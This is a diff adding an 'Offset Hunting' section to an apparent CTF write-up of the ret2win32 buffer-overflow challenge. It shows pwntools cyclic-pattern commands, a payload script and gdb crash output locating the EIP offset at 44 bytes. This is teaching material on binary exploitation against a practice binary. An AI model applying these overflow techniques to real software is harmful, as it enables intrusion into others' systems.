@@ -195,6 +195,81 @@ Invalid address 0x43434343
 
 Boom! We get a **segmentation fault**—as expected. The **EIP** is overwritten with `0x43434343` (`CCCC`), and the saved **EBP** is `0x42424242` (`BBBB`).
 
+
+### Offset Hunting
+
+In this challenge, finding the correct offset is fairly straightforward because the binary is simple and we can easily reverse-engineer it. From our earlier analysis, we already know:
+
+- **40 bytes** fill the buffer.
+- Then we overwrite **EBP** (saved base pointer).
+- Next, we overwrite the **return address** (EIP).
+
+However, what if we’re dealing with a **more complex binary** where reverse engineering isn’t as easy? In such cases, we can use a very handy technique: the **De Bruijn pattern** (also known as a cyclic pattern).
+
+**Why Use De Bruijn Patterns?**
+
+According to Wikipedia:
+_A de Bruijn sequence of order n on a size-k alphabet A_ is a cyclic sequence in which every possible length-n string on A occurs exactly once as a substring.
+
+In **binary exploitation**, **De Bruijn patterns** (also known as **cyclic patterns**) are specially crafted strings designed to help you **precisely identify the offset where your input overwrites critical parts of memory**—such as instruction pointers, program counters, or registers that control execution flow.
+
+We can easily generate De Bruijn (cyclic) patterns using **pwntools**, a popular CTF and binary exploitation framework.
+
+```bash
+pip install pwntools
+pwn cyclic -h # Help
+# pwn cyclic [len]
+# pwn cyclic -l [lookup]
+```
+
+Generate a pattern of 100 bytes:
+
+```bash
+pwn cyclic 100
+```
+
+Use this in our exploit.
+
+```python
+#!/usr/bin/python3
+import sys
+
+payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'           # cyclic 100
+
+sys.stdout.buffer.write(payload)
+```
+
+```bash
+./exp.py > exp.txt
+gdb ./ret2win32 
+pwndbg> r < exp.txt
+# ...
+ EBP  0x6161616b ('kaaa')
+ ESP  0xffffd4f0 ◂— 0x6161616d ('maaa')
+ EIP  0x6161616c ('laaa')
+─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
+Invalid address 0x6161616c
+
+```
+
+Find the exact offset after a crash -
+
+```bash
+cyclic -l 0x6161616c
+44
+```
+
+So, our input has overwritten the register EIP after 44 offset.
+
+For getting offset for EBP -
+
+```bash
+cyclic -l 0x6161616b
+40
+```
+
+As you can see this is matching our earlier calculation.
+
 Now we just need to replace `CCCC` with the actual address of the `ret2win` function.
 
 Let’s find its address:
